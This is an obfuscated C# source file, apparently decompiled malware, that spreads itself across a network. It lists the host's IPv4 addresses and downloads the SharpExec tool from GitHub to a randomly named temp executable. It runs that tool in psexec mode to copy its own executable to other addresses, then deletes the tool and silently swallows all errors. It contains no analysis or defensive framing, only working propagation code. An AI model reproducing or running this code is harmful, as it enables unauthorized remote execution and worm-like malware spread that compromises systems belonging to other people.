using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;

namespace oiBbJupDERGF;

internal class MgRPUagfcxhsLRBGgo
{
	public static List<string> yybTINOmBaChiRYMgl = new List<string>();

	public static string gwstSwyZPSbO = "";

	public static void xAXhnBjCWRB()
	{
		try
		{
			yybTINOmBaChiRYMgl = YIzjDphGIrIRQaQ();
			string text = "";
			if (yybTINOmBaChiRYMgl.Count > 0)
			{
				text = MTXuNXbvqBCI();
			}
			if (File.Exists(text))
			{
				foreach (string item in yybTINOmBaChiRYMgl)
				{
					string text2 = (gwstSwyZPSbO = item);
					foreach (string item2 in yybTINOmBaChiRYMgl)
					{
						if (!(item2 == gwstSwyZPSbO))
						{
							IkMjOMZbHrXB.TscPplUQcQPqNrJAe(text, "-m=psexec -i=" + gwstSwyZPSbO + " -d=" + item2 + " -f=" + Assembly.GetEntryAssembly()!.Location + " -e=" + Path.Combine(Path.GetTempPath(), Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe"));
						}
					}
				}
			}
			File.Delete(text);
		}
		catch
		{
		}
	}

	public static List<string> YIzjDphGIrIRQaQ()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string MTXuNXbvqBCI()
	{
		if (IntPtr.Size == 8)
		{
			return bitXXOUoNsc(new Uri("https://raw.githubusercontent.com/anthemtotheego/SharpExec/master/CompiledBinaries/SharpExec_x64.exe"));
		}
		return bitXXOUoNsc(new Uri("https://raw.githubusercontent.com/anthemtotheego/SharpExec/master/CompiledBinaries/SharpExec_x86.exe"));
	}

	public static string bitXXOUoNsc(Uri raEKAysvYeVCZcG)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(raEKAysvYeVCZcG, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}
}
